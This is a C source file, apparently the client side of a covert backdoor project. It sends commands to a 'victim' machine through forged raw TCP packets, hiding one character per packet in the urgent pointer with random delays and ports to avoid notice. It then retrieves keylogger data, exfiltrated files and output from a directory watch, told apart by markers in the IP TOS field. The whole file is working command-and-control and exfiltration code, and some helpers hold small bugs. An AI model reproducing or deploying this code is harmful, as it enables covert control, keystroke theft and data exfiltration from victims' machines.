/*==============================================================================
|   SOURCE:     client.c
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Source file for client program. Contains function calls that
|               pretain to client actions.
==============================================================================*/
#include "../include/client.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>

/*------------------------------------------------------------------------------
|   FUNCTION:   void run_client(Client_Args clt_args)
|                   clt_args - client args to pass to directory watch thread and command loop
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Creates directory watch thread and command loop function.
------------------------------------------------------------------------------*/
void run_client(Client_Args clt_args)
{
    pthread_t dw_sniffer_thrd;
    pthread_create(&dw_sniffer_thrd, NULL, dw_sniffer, (void *) &clt_args);

    memset(dw_filename, '\0', sizeof(dw_filename));
    run_cmd_loop(clt_args);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void run_cmd_loop(Client_Args clt_args)
|                   clt_args - client args to pass to command process function
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       The command loop of the client program. Gets user input passes
|               the data to function to process the command.
------------------------------------------------------------------------------*/
void run_cmd_loop(Client_Args clt_args)
{
    char cmd[BUF_MED];

    while(1)
    {
        memset(cmd, '\0', sizeof(cmd));

        // Get command from user
        strcpy(cmd, get_cmd(clt_args));

        if(process_cmd(cmd, clt_args) == -1)
            return;
    }
}

/*------------------------------------------------------------------------------
|   FUNCTION:   char *get_cmd(Client_Args clt_args)
|                   clt_args - use host_ip from client args to print to screen
|
|   RETURN:     Returns a string (user input)
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Gets the users input (command) and returns the string.
------------------------------------------------------------------------------*/
char *get_cmd(Client_Args clt_args)
{
    static char cmd[BUF_MED];
    memset(cmd, '\0', sizeof(cmd));

    printf("\n\033[1;36m%s: \033[0m", clt_args.host_ip);
    fgets(cmd, sizeof(cmd), stdin);
    printf("\n");

    return cmd;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void get_filename(char *path, char name[BUF_SML])
|                   *path - full file path to extract file name from
|                   name  - buffer to hold the extracted filename in
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Extracts the filename from the full file path in *path into
\               name.
------------------------------------------------------------------------------*/
void get_filename(char *path, char name[BUF_SML])
{
    char tmp[BUF_SML];
    memset(tmp, '\0', sizeof(tmp));
    memset(name, '\0', sizeof(&name));

    int j = 0;

    for(int i = strlen(path); i > 0; i--)
    {
        if(path[i] == '/')
        {
            j = 0;
            break;
        }
        else if(path[i] != '\0')
        {
            tmp[j] = path[i];
            j++;
        }
    }

    for(int i = strlen(tmp); i > 0; i--)
    {
        if(tmp[i] != '\0')
        {
            name[j] = tmp[i];
            j++;
        }
    }
}

/*------------------------------------------------------------------------------
|   FUNCTION:   int process_cmd(char cmd[BUF_MED], Client_Args clt_args)
|                   cmd - command string to process
|                   clt_args - holds IPs that need to be used in sending and receiving functions
|
|   RETURN:     0 on success, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Checks for the type of command the user inputed and performs
|               the appropriate action.
------------------------------------------------------------------------------*/
int process_cmd(char cmd[BUF_MED], Client_Args clt_args)
{
    Pcap_Args pcap_args;
    char *tmp = strdup(cmd);
    char *token1 = strsep(&tmp, " ");    // extract first string before space character
    char *token2;

    if(strcmp(cmd, CMD_EXIT) == 0)              // exit command
    {
        if(send_cmd(cmd, clt_args) == -1)
            return -1;
        printf("Terminating\n\n");
        exit(1);
    }
    else if(strcmp(cmd, CMD_GET_KL) == 0)       // get keylogger command
    {
        if(send_cmd(cmd, clt_args) == -1)
            return -1;
        read_cmd_response(&pcap_args);
    }
    else if(strcmp(token1, CMD_GETFILE) == 0)   // exfiltration command
    {
        if((token2 = strsep(&tmp, " ")) != NULL)  // extract file path
        {
            memset(pcap_args.filename, '\0', sizeof(pcap_args.filename));

            get_filename(token2, pcap_args.filename);  // extract filename
            if(send_cmd(cmd, clt_args) == -1)
                return -1;
            read_cmd_response(&pcap_args);
        }
    }
    else if(strcmp(token1, CMD_DW) == 0)       // directory watch command
    {
        if((token2 = strsep(&tmp, " ")) != NULL)  // check if diretory specified
        {
            if(send_cmd(cmd, clt_args) == -1)
                return -1;
        }
    }
    else                                    // regular command
    {
        if(send_cmd(cmd, clt_args) == -1)
            return -1;
        read_cmd_response(&pcap_args);
    }

    return 0;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   int send_cmd(char cmd[BUF_MED], Client_Args clt_args)
|                   cmd - command string to send
|                   clt_args - has IPs to use in forging IP header
|
|   RETURN:     0 on success, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Sends the command string to the server. Uses raw sockets
------------------------------------------------------------------------------*/
int send_cmd(char cmd[BUF_MED], Client_Args clt_args)
{
    struct sockaddr_in sin;
    Packet pkt;
    int sd;
    int delay;

    // random seed
    time_t t;
    srand((unsigned) time(&t));

    // create socket
    if((sd = create_socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return -1;

    // forge IP and TCP headers
    forge_ip(&pkt, 'c', inet_addr(clt_args.my_ip), inet_addr(clt_args.host_ip));
    forge_tcp(&pkt);

    // check sums
    pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
    pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

    // set sockaddr
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = pkt.ip.daddr;
    sin.sin_port = pkt.tcp.source;

    // iterate thru cmd char by char
    for(size_t i = 0; i < strlen(cmd); i++)
    {
        // set random delay
        delay = rand() % clt_args.max_delay + clt_args.min_delay;
        sleep(delay);

        // encode char into tcp urgent pointer
        pkt.tcp.urg_ptr = cmd[i];

        // send cmd
        if(sendto(sd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
        {
            printf("\nError sending data: %s\n\n", strerror(errno));
            close(sd);
            return -1;
        }

        // randomize source/dest port and sequence number
        pkt.tcp.source = htons(rand() % 15000 + 7000);
        pkt.tcp.dest = htons(rand() % 15000 + 7000);
        pkt.tcp.seq = 1+(int)(10000000.0*rand()/(RAND_MAX+1.0));
    }

    close(sd);
    return 0;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void read_cmd_response(Pcap_Args *pcap_args)
|                   *pcap_args - argments to pass to pcap callback function
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       High level function to abstract from setting up a pcap loop.
------------------------------------------------------------------------------*/
void read_cmd_response(Pcap_Args *pcap_args)
{
    setup_pcap_loop(pcap_args);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void setup_pcap_loop(Pcap_Args *pcap_args)
|                   *pcap_args - arguments to pass to pcap callback function
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Sets up a pcap loop to read TCP packets
------------------------------------------------------------------------------*/
void setup_pcap_loop(Pcap_Args *pcap_args)
{
    struct bpf_program fp;
    pcap_if_t *interface_list;
    pcap_t *handle;
    struct pcap_pkthdr header;
    const u_char *packet;
    char errbuff[PCAP_ERRBUF_SIZE];

    // Find the first NIC that is up and sniff packets from it
    if(pcap_findalldevs(&interface_list, errbuff) == -1)
    {
        printf("%s\n",errbuff);
        return;
    }

    // Open the device for packet capture & set the device in promiscuous mode
    pcap_args->handle = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errbuff);
    if(pcap_args->handle == NULL)
    {
        printf("%s\n",errbuff);
        return;
    }

    // Compile the filter expression
    if(pcap_compile (pcap_args->handle, &fp, "tcp", 0, PCAP_NETMASK_UNKNOWN) == -1)
    {
        fprintf(stderr,"Error calling pcap_compile\n");
        return;
    }

    // Load the filter into the capture device
    if (pcap_setfilter(pcap_args->handle, &fp) == -1)
    {
        fprintf(stderr,"Error setting filter\n");
        return;
    }

    // start listening for packets
    pcap_loop (pcap_args->handle, -1, pcap_clt_callback, (u_char *)pcap_args);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void append_data(char *filename, char c)
|                   *filename - name of file to append to
|                   c - character to append
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Appends a single character to a file.
------------------------------------------------------------------------------*/
void append_data(char *filename, char c)
{
    FILE *file;
    file = fopen(filename, "a+");
    fflush(file);
    fprintf(file, "%c", c);
    fclose(file);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void pcap_clt_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
|                   *args - function arguments
|                   *header - pcap header structure
|                   *packet - packet thats captures
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Function that is called everytime a TCP packet is received.
|               checks if packet is from server and performs the according
|               action.
------------------------------------------------------------------------------*/
void pcap_clt_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    char exfil_name[BUF_MED] = "../data/";
    Pcap_Args *pcap_args = (Pcap_Args *) args;
    struct iphdr *ip;
    struct tcphdr *tcp;
    int eth_size = sizeof(struct ether_header);
    int ip_size;

    // get IP header
    ip = (struct iphdr *)(packet + eth_size);
    ip_size = ip->ihl*4;        // get IP header size

    // create file path if filename is present (for exfiltration)
    if(strlen(pcap_args->filename) > 0)
        strcat(exfil_name, pcap_args->filename);

    // get TCP header
    tcp = (struct tcphdr *)(packet + eth_size + ip_size);

    if(ip->tos == 'o')              // if packet contains regular command output data
    {
        if(tcp->urg_ptr != '\0')
        {
            printf("%c", tcp->urg_ptr);
            fflush(stdout);
        }
        else
        {
            pcap_breakloop(pcap_args->handle);
        }
    }
    else if(ip->tos == 'k')         // if packet contains keylogger data
    {
        if(tcp->urg_ptr != '\0')
        {
            append_data(FILE_KEY_LOGGER, tcp->urg_ptr);
        }
        else
        {
            printf("File keylogger retrieved\n");
            fflush(stdout);
            pcap_breakloop(pcap_args->handle);
        }
    }
    else if(ip->tos == 'x')         // if packet contains exfilration data
    {
        if(tcp->urg_ptr != '\0')
        {
            append_data(exfil_name, tcp->urg_ptr);
        }
        else
        {
            printf("File %s retrieved\n", pcap_args->filename);
            fflush(stdout);
            pcap_breakloop(pcap_args->handle);
        }
    }
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void *dw_sniffer(void *ptr)
|                   *ptr - arguments passed to thread
|
|   RETURN:     void pointer
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Thread that listens for any files that were created in a
|               monitored direcotry on the victims machine.
------------------------------------------------------------------------------*/
void *dw_sniffer(void *ptr)
{
    Client_Args *clt_args = ptr;
    char filter[BUF_MED] = "tcp && src host ";
    struct bpf_program fp;
    pcap_if_t *interface_list;          /* List of nics */
    pcap_t *handle;                     /* Session handle */
    struct pcap_pkthdr header;	        /* The header that pcap gives us */
    const u_char *packet;		        /* The actual packet */
    char errbuff[PCAP_ERRBUF_SIZE];     /* Where pcap error messesages get written */

    strcat(filter, clt_args->host_ip);

    // Find the first NIC that is up and sniff packets from it
    if(pcap_findalldevs(&interface_list, errbuff) == -1)
    {
        printf("%s\n",errbuff);
        pthread_exit(NULL);
    }

    // Open the device for packet capture & set the device in promiscuous mode
    handle = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errbuff);
    if(handle == NULL)
    {
        printf("%s\n",errbuff);
        pthread_exit(NULL);
    }

    // Compile the filter expression
    if(pcap_compile (handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1)
    {
        fprintf(stderr,"Error calling pcap_compile\n");
        pthread_exit(NULL);
    }

    // Load the filter into the capture device
    if (pcap_setfilter(handle, &fp) == -1)
    {
        fprintf(stderr,"Error setting filter\n");
        pthread_exit(NULL);
    }

    // start listening for TCP packets
    pcap_loop (handle, -1, pcap_dw_callback, (void *) &clt_args);

    pthread_exit(NULL);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void pcap_dw_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
|                   *args - function arguments
|                   *header - pcap header structure
|                   *packet - packet thats captures
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Function that is called everytime a TCP packet is received.
|               check if server is trying to send a file that was newly
|               created in a monitored directory.
------------------------------------------------------------------------------*/
void pcap_dw_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct iphdr *ip;
    struct tcphdr *tcp;
    int eth_size = sizeof(struct ether_header);
    int ip_size;

    // get IP header
    ip = (struct iphdr *)(packet + eth_size);
    ip_size = ip->ihl*4;        // get IP header size

    // get TCP header
    tcp = (struct tcphdr *)(packet + eth_size + ip_size);

    if(ip->tos == 'n')          // received EOT
    {
        if(tcp->urg_ptr != '\0')
        {
            dw_filename[strlen(dw_filename)] = tcp->urg_ptr;
        }
    }
    else if(ip->tos == 'd')     // if packet contains file data
    {
        if(tcp->urg_ptr != '\0')
        {
            char filename[BUF_MED] = "../data/";
            strcat(filename, dw_filename);
            append_data(filename, tcp->urg_ptr);
        }
        else
        {
            fflush(stdout);
            memset(dw_filename, '\0', sizeof(dw_filename));
        }
    }
}
